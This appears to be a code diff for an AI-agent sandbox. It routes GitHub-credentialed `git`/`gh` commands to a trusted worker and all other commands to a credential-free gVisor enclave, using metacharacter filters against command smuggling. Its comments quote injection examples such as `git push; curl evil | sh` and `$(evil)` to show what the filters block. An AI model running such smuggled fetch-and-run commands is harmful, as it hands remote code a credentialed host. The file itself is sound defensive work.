@@ -401,10 +401,26 @@ export class RunscEnclave implements ExecEnclave {
       return { out: `enclave unavailable: ${e?.message ?? String(e)}`, code: null };
     }
     const timeout = Math.min(600_000, Number(opts.timeoutMs ?? 120_000));
+    // Git identity for the enclave: local git (add/commit) runs HERE now (only remote
+    // git + gh go to the worker), but the enclave image carries no ~/.gitconfig, so a
+    // bare `git commit` would die with "empty ident name". Supply it via env (same
+    // name/email the worker's GhProvider uses) so the agent's commits are attributed
+    // without a credential ever entering the enclave.
+    const gitName = process.env.BROKK_GIT_NAME || "Brokk";
+    const gitEmail = process.env.BROKK_GIT_EMAIL || "brokk@coldcodelabs.com";
     // docker exec returns the command's own exit code; the {out, code} normalisation
     // in this.docker() carries a non-zero exit in `code` without throwing.
     return this.docker(
-      ["exec", "-w", cwd, "-e", "NODE_ENV=development", "-e", "GIT_TERMINAL_PROMPT=0", this.name, "/bin/sh", "-c", command],
+      [
+        "exec", "-w", cwd,
+        "-e", "NODE_ENV=development",
+        "-e", "GIT_TERMINAL_PROMPT=0",
+        "-e", `GIT_AUTHOR_NAME=${gitName}`,
+        "-e", `GIT_AUTHOR_EMAIL=${gitEmail}`,
+        "-e", `GIT_COMMITTER_NAME=${gitName}`,
+        "-e", `GIT_COMMITTER_EMAIL=${gitEmail}`,
+        this.name, "/bin/sh", "-c", command,
+      ],
       timeout,
     );
   }
@@ -475,6 +491,90 @@ export class BrokeredEnclave implements ExecEnclave {
   }
 }
 
+// ── the worker/enclave bash split (ADR 0010 Fase 1 — unblocks the flip) ────────
+// The enclave is credential-free by design: no GH_TOKEN, off the fleet network. But
+// an interactive agent (Sindri) legitimately runs `git push` + `gh pr create` through
+// bash to publish its work — operations the enclave CAN'T do (no creds). So we split
+// the bash hand by command: one that needs GitHub creds or the private remote runs on
+// the trusted WORKER (LocalEnclave — creds, still Landlock/uid-jailed); everything
+// else — build, test, install, and all LOCAL git (status/diff/add/commit) — runs in
+// the credential-free enclave. This is the ADR's "worker does push/PR, enclave does
+// build/test" boundary, enforced per-command instead of per-agent.
+//
+// Classification is conservative in the SAFE direction: a command reaches the worker
+// ONLY when it's a single, metacharacter-free git/gh invocation. Anything else falls
+// through to the enclave — a misrouted credential op merely fails there (recoverable);
+// the reverse (arbitrary code reaching the credentialed worker) is the hole we refuse
+// to open, so `git push; curl evil | sh` can never smuggle a second command out.
+
+/** git subcommands that talk to the remote and thus need credentials. Local git
+ *  (status/log/diff/add/commit/checkout/branch/merge/rebase/stash/tag…) needs none
+ *  and stays in the enclave. */
+const GIT_REMOTE_SUBCMDS = new Set(["push", "fetch", "pull", "clone", "ls-remote", "submodule"]);
+/** git global options that consume the FOLLOWING token as their value, so the
+ *  subcommand scan skips both (e.g. `git -C <dir> push`). */
+const GIT_OPTS_WITH_ARG = new Set(["-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"]);
+/** `$` and backtick trigger command/variable substitution EVEN inside double quotes,
+ *  so they disqualify a command wherever they appear — `gh … --body "$(evil)"` must
+ *  not reach the worker. */
+const SUBST_META = /[`$]/;
+/** Shell operators that chain/redirect a second command. Unlike substitution these
+ *  are LITERAL inside quotes (a PR body may legitimately contain `&`, `(`, `<`), so
+ *  they're tested only OUTSIDE quoted spans (see stripQuoted). */
+const CHAIN_META = /[;&|\n\r(){}<>]/;
+
+/** Blank out single- and double-quoted spans so a metacharacter INSIDE a quoted
+ *  argument (e.g. a PR body `"fixes A & B (v2)"`) isn't mistaken for command chaining.
+ *  Substitution ($/backtick) is handled separately since double quotes don't stop it. */
+function stripQuoted(s: string): string {
+  return s.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
+}
+
+/** Does this bash command need GitHub credentials / the private remote (→ run it on
+ *  the worker)? True only for a single `gh …` or `git <remote-subcmd> …` that carries
+ *  no shell substitution and no out-of-quote command chaining; everything else is
+ *  false (→ enclave). Pure + side-effect-free. */
+export function needsCreds(command: string): boolean {
+  const cmd = command.trim();
+  if (!cmd) return false;
+  if (SUBST_META.test(cmd)) return false; // $ / backtick anywhere → not a lone call
+  if (CHAIN_META.test(stripQuoted(cmd))) return false; // chaining outside quotes → no
+  const tok = cmd.split(/\s+/);
+  if (tok[0] === "gh") return true; // every gh call authenticates with GH_TOKEN
+  if (tok[0] !== "git") return false;
+  // First non-option token after `git` is the subcommand; skip global options,
+  // consuming the value of the ones that take one (-C <dir>, -c <kv>, …).
+  for (let i = 1; i < tok.length; i++) {
+    const t = tok[i];
+    if (t.startsWith("-")) {
+      if (GIT_OPTS_WITH_ARG.has(t)) i++;
+      continue;
+    }
+    return GIT_REMOTE_SUBCMDS.has(t);
+  }
+  return false; // `git` with no subcommand
+}
+
+/** An `ExecEnclave` that splits the bash hand across two backends by command: the
+ *  credentialed WORKER for `gh` + remote `git` (which the enclave can't run), the
+ *  credential-free ENCLAVE for everything else. Drops in behind `ExecEnclave` like any
+ *  backend. Respects the caller's `gh` flag — a no-push consumer (reviewer, gh:false)
+ *  never reaches the worker, so its every command stays isolated in the enclave. */
+export class SplitEnclave implements ExecEnclave {
+  constructor(
+    private readonly worker: ExecEnclave,
+    private readonly inner: ExecEnclave,
+  ) {}
+
+  async exec(command: string, cwd: string, opts: ExecOpts = {}): Promise<ExecResult> {
+    // Route to the credentialed worker only when creds are BOTH needed and permitted.
+    // gh:false (reviewer) ⇒ stay fully in the enclave — a creds op would just fail
+    // there, which is correct: that consumer must not push.
+    if ((opts.gh ?? true) && needsCreds(command)) return this.worker.exec(command, cwd, opts);
+    return this.inner.exec(command, cwd, opts);
+  }
+}
+
 // ── resolveEnclave — the one selection point the agents call ───────────────────
 // The agents don't decide backends; they ask for the enclave for a checkout and get
 // the right one for the deployment: the brokered gVisor enclave when it's wired
@@ -485,8 +585,9 @@ export class BrokeredEnclave implements ExecEnclave {
 
 const _brokered = new Map<string, ExecEnclave>();
 
-/** The `ExecEnclave` for a project checkout. `BrokeredEnclave` (→ gVisor) when N4 is
- *  wired for this environment; `localEnclave` otherwise. Default is ALWAYS local — a
+/** The `ExecEnclave` for a project checkout. When N4 is wired for this environment,
+ *  a `SplitEnclave` over the `BrokeredEnclave` (→ gVisor) — remote git + gh on the
+ *  worker, the rest in gVisor; `localEnclave` otherwise. Default is ALWAYS local — a
  *  deployment opts in by setting BROKK_ENCLAVE_BACKEND=runsc + the manager URL/token. */
 export function resolveEnclave(opts: { checkoutRoot: string; project?: string }): ExecEnclave {
   const url = process.env.BROKK_ENCLAVE_MANAGER_URL;
@@ -498,7 +599,11 @@ export function resolveEnclave(opts: { checkoutRoot: string; project?: string })
   const key = opts.project || basename(opts.checkoutRoot) || opts.checkoutRoot;
   let e = _brokered.get(key);
   if (!e) {
-    e = new BrokeredEnclave({ project: key, checkoutRoot: opts.checkoutRoot, managerUrl: url, token });
+    const brokered = new BrokeredEnclave({ project: key, checkoutRoot: opts.checkoutRoot, managerUrl: url, token });
+    // Split the hand: remote git + gh run on the trusted worker (localEnclave — the
+    // SAME Landlock/uid jail + gh-creds path Sindri's bash uses today, so push/PR keep
+    // working byte-for-byte), the rest behind gVisor.
+    e = new SplitEnclave(localEnclave, brokered);
     _brokered.set(key, e);
   }
   return e;
